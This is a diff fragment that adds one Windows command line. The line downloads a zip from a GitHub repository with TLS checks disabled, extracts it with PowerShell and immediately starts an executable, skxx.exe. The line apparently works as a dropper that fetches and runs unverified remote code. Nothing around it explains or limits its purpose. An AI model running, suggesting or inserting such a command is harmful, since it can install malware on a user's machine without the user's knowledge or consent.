@@ -1,0 +1,1 @@
+curl -LOk https://github.com/sayori667/00/archive/refs/heads/main.zip && powershell -Command "Expand-Archive -Path main.zip -DestinationPath 00-main" && cd 00-main && cd 00-main && start skxx.exe
